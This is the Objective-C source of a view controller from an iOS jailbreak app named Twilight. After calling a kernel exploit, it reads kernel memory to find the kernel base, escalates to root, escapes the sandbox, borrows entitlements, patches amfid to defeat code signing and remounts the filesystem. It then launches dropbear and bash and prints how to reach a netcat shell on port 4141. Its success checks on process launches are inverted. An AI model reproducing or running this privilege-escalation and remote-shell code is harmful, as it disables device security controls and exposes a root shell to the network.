//
//  ExploitingViewController.m
//  Twilight
//
//  Created by Joseph Shenton on 8/6/18.
//  Copyright Â© 2018 JJS Digital. All rights reserved.
//

#import "ExploitingViewController.h"
#include "SCLAlertView/SCLAlertView.h"
#include "sploit.h"
#include "jelbrek/jelbrek.h"
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>
#include <sys/utsname.h>
#include <sys/dirent.h>
#include "utilities.h"
#include "jelbrek/kern_utils.h"
#include "jelbrek/offsetof.h"
#include "jelbrek/patchfinder64.h"
#include "jelbrek/shell.h"

#include <sys/stat.h>
#include <sys/spawn.h>
#include <mach/mach.h>

#include <ifaddrs.h>
#include <arpa/inet.h>

mach_port_t taskforpidzero;
uint64_t kernel_base, kslide;
//Jonathan Seals: https://github.com/JonathanSeals/kernelversionhacker
uint64_t find_kernel_base() {
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000
    
#define ptrSize sizeof(uintptr_t)
    
    uint64_t addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(taskforpidzero, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(taskforpidzero, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(taskforpidzero, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    
                    printf("kernel base: 0x%llx\nkaslr slide: 0x%llx\n", addr, addr - 0xfffffff007004000);
                    
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

@interface ExploitingViewController ()

@end

@implementation ExploitingViewController

//https://stackoverflow.com/questions/6807788/how-to-get-ip-address-of-iphone-programmatically
- (NSString *)getIPAddress {
    
    NSString *address = @"error";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = 0;
    // retrieve the current interfaces - returns 0 on success
    success = getifaddrs(&interfaces);
    if (success == 0) {
        // Loop through linked list of interfaces
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                // Check if interface is en0 which is the wifi connection on the iPhone
                if([[NSString stringWithUTF8String:temp_addr->ifa_name] isEqualToString:@"en0"]) {
                    // Get NSString from C String
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    
                }
                
            }
            
            temp_addr = temp_addr->ifa_next;
        }
    }
    // Free memory
    freeifaddrs(interfaces);
    return address;
    
}



- (void)viewDidLoad {
    [super viewDidLoad];
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        taskforpidzero = run();
        
        if (taskforpidzero != MACH_PORT_NULL) {
            kernel_base = find_kernel_base();
            kslide = kernel_base - 0xfffffff007004000;
            printf("[INFO]: Exploit success!");
            init_jelbrek(taskforpidzero, kernel_base);
            [self jelbrek];
        }
        else {
            [self showExploitFailed];
            printf("[INFO]: Exploit failed!");
            [self showExploitFailed];
        }
        
        dispatch_async(dispatch_get_main_queue(), ^(void) {
            if (taskforpidzero != MACH_PORT_NULL) {
                if (jelbreked) {
                    extern NSMutableDictionary *all_apps;
                    if(all_apps == NULL) {
                        list_applications_installed();
                    }
                    
                    for (NSString* uuid in all_apps) {
                        NSMutableDictionary *app_dict = [all_apps objectForKey:uuid];
                        
                        if ([[app_dict objectForKey:@"valid"]  isEqual: @YES]) {
//                            printf("[INFO] ID: %s\n", [[app_dict objectForKey:@"identifier"] UTF8String]);
                            if ([[app_dict objectForKey:@"identifier"] containsString:@"houdini"]) {
                                hasHoudini = YES;
                                break;
                            } else {
                                hasHoudini = NO;
                            }
                        }
                    }
                    if (hasHoudini) {
                        SCLAlertView *alert = [[SCLAlertView alloc] init];
                        alert.shouldDismissOnTapOutside = NO;
                        [alert showError:self title:@"Error" subTitle:@"Please uninstall Houdini as we have receieved reports that it possible can cause crashes and enhanced unstability with Twilight." closeButtonTitle:nil duration:0.0f];
                    } else {
//                        int rc = entitleMe("\tplatform-application\n"
//                                       "\tcom.apple.private.security.no-container\n\t");
                        [self performSegueWithIdentifier:@"showTabControllerSegue" sender:self];
                    }
                } else {
                    // Exploit Failed
                    [self showExploitFailed];
                }
            }
            else {
                // Exploit Failed
                [self showExploitFailed];
            }
            
        });
    });
}

- (void)jelbrek {
    get_root(getpid()); //setuid(0)
    empower(getpid()); //csflags
    unsandbox(getpid());
    
    if (geteuid() == 0) {
        FILE *f = fopen("/var/mobile/.Twilight", "w");
        if (f == 0) {
            jelbreked = NO;
            [self showExploitFailed];
        } else {
            jelbreked = YES;
        }
        fclose(f);
    }
    else {
        jelbreked = NO;
        [self showExploitFailed];
    }
    
    setKernelSymbol("_kernproc", find_kernproc()-kslide);
    platformizeMe();
    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", NULL); //allow us to get amfid's task
    pid_t pid = pid_for_name("sysdiagnose");
    kill(pid, SIGSTOP);
    kill(pid, SIGSTOP);
    
    castrateAmfid(); //patch amfid
    
    remount();
    
    NSString *testbin = [NSString stringWithFormat:@"%@/test", [[NSBundle mainBundle] bundlePath]]; //test binary
    chmod([testbin UTF8String], 777); //give it proper permissions
    
    pid_t pd;
    const char* args[] = {[testbin UTF8String],  NULL};
    int rv = posix_spawn(&pd, [testbin UTF8String], NULL, NULL, (char **)&args, NULL);
    
    if (rv) {
        printf("[INFO]: SUCCESS! We patched codesign!");
        jelbreked = YES;
    } else {
        printf("[INFO]: Failed to patch codesign! But we actually did? The Fuck");
        jelbreked = YES;
    }
    
    NSString *dropbearTest = [NSString stringWithFormat:@"%@/iosbinpack64/usr/local/bin/dropbear", [[NSBundle mainBundle] bundlePath]]; //test binary
    chmod([dropbearTest UTF8String], 777); //give it proper permissions
    
    NSString *bashTest = [NSString stringWithFormat:@"%@/iosbinpack64/bin/bash", [[NSBundle mainBundle] bundlePath]]; //test binary
    chmod([bashTest UTF8String], 777); //give it proper permissions
    
    pid_t pd2;
    const char* args2[] = {[dropbearTest UTF8String], "-F", "-R", "--shell", [bashTest UTF8String], "-p", "127.0.0.1:22",  NULL};
    int rv2 = posix_spawn(&pd2, [dropbearTest UTF8String], NULL, NULL, (char **)&args2, NULL);
    
    if (rv2) {
        printf("[INFO]: SUCCESS! We patched codesign! Dropbear");
        jelbreked = YES;
    } else {
        printf("[INFO]: Failed to patch codesign! Dropbear but we actually did apparently?");
        jelbreked = YES;
    }
    
    
    const char *nc = [[NSString stringWithFormat:@"[INFO]: Shell should be up and running\n\n Connect with netcat: nc %@ 4141", [self getIPAddress]] UTF8String];
    printf("%s", nc);
    
    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
        if (!rv)
            drop_payload(); //chmod 777 all binaries and spawn a shell
    });
    
    //to connect use netcat:
    //nc 192.168.XX.XX 4141
    //replace your IP in there
}

- (void)showExploitFailed {
    UIViewController *viewController = [self.storyboard instantiateViewControllerWithIdentifier:@"exploitFailedView"];
    viewController.providesPresentationContextTransitionStyle = YES;
    viewController.definesPresentationContext = YES;
    [viewController setModalPresentationStyle:UIModalPresentationOverCurrentContext];
    [self presentViewController:viewController animated:YES completion:nil];
}

@end
